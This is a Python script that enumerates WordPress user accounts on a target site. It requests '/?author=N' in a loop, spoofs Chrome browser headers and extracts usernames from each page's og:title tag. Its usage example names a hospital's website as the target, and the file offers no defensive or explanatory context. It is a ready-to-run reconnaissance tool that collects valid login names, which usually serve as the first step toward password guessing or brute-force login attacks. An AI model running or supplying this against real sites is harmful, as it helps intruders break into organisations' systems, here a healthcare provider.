import requests
from bs4 import BeautifulSoup
import sys

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <domain>")
    print(f"Example: python {sys.argv[0]} https://louranhospital.com")
    sys.exit(1)

domain = sys.argv[1].rstrip("/")
host_header = domain.replace("https://", "").replace("http://", "")

headers = {
    "Host": host_header,
    "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

i = 1
while True:
    url = f"{domain}/?author={i}"
    try:
        response = requests.post(url, headers=headers, timeout=10)
    except requests.RequestException as e:
        print(f"[author={i}] Request failed: {e}")
        break

    if response.status_code == 404:
        break

    soup = BeautifulSoup(response.text, 'html.parser')
    meta_tag = soup.find("meta", attrs={"property": "og:title"})

    if meta_tag and meta_tag.has_attr("content"):
        full_title = meta_tag["content"]
        username = full_title.split(" -")[0].strip()
        print(username)

    i += 1
